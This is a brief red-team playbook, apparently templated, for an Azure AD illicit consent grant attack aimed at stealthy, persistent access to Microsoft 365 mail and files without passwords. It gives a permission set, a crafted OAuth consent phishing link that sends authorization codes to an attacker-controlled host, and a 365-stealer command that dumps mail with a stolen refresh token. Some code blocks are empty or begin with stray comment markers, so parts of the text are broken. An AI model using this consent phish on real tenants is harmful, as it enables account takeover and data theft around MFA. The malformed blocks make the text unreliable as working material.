# Azure AD Illicit Consent Grant Attack

## When to Use
- When conducting cloud-focused Red Team engagements where standard credential phishing is blocked by strong Multi-Factor Authentication (MFA).
- To maintain stealthy, persistent access to a user's Microsoft 365 data (emails, OneDrive) by relying on OAuth refresh tokens rather than stolen passwords.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Registering the Malicious Application

```bash
# ```

### Phase 2: Defining Scopes and Permissions

```json
// // {
  "requestedPermissions": [
    { "id": "Mail.ReadWrite", "type": "Scope" },
    { "id": "Files.ReadWrite.All", "type": "Scope" },
    { "id": "User.Read", "type": "Scope" }
  ]
}
```

### Phase 3: Crafting the Consent Link (The Phish)

```http
# # https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
client_id=ATTACKER_APP_ID
&response_type=code
&redirect_uri=https://attacker-controlled-site.com/callback
&response_mode=query
&scope=Mail.ReadWrite%20Files.ReadWrite.All%20User.Read%20offline_access
&state=12345
```

### Phase 4: Harvesting the Tokens and Accessing Data

```bash
# python3 365-stealer.py --refresh-token [STOLEN_REFRESH_TOKEN] --dump-mail
```
